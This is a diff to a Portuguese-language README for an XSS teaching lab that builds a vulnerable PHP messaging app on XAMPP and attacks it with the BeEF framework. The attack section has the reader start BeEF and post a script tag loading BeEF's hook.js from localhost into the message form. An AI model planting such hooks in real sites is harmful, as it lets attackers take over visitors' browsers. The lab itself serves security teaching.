@@ -84,15 +84,15 @@ Pois iremos utilizar o php, apache e o banco de dados.
 #### Configurar o banco
 
 Ao instalar o xamp ele traz a ferramenta phpmyadmin nela:
-* Criar o banco com o nome "messeger"
-* Importar o arquivo messeger.sql disponivel no projeto que será baixado e servirá para criar a tabela.
+* Crie o banco com o nome "messeger"
+* Importe o arquivo messeger.sql disponivel no projeto que será baixado e servirá para criar a tabela.
 
 
-### Baixe o projeto neste github
+### Baixe este projeto
 
 * Edite o arquivo db.php no projeto com os dados (usuario e senha) do seu banco.
 
-* Após editar o projeto, coloque na pasta (/opt/lampp/htdocs)
+* Após editar o arquivo, coloque na pasta (/opt/lampp/htdocs)
 
 * Verifique se o servidor tá rodando e acesse http://localhost/messager/
 
@@ -105,13 +105,13 @@ Se tudo tive ocorrido bem está é a página que vai mostrar
 
 ## O Ataque
 
-Para iniciar, iremos acessar a página que o beef foi baixado ou clonado e lá iniciar o framework com o comando especificado abaixo
+Para iniciar, iremos acessar a página onde o beef foi baixado ou clonado e lá iniciar o framework com o comando especificado abaixo:
 
 ``` js
 ./beef
 ```
 
-Então preencha o formulário da tela anterior com um email qualquer text@text e no campo mensagem digite 
+Então preencha o formulário da tela anterior com um email qualquer text@text e no campo mensagem digite: 
 
 ``` js
 <script src="http://127.0.0.1:3000/hook.js"></script>
@@ -149,3 +149,8 @@ Existe uma infinidade de opções. Fique a vontade para usar.
 
 
 
+# Referências   
+
+https://excess-xss.com/#xss-attacks
+
+https://github.com/beefproject/beef/wiki
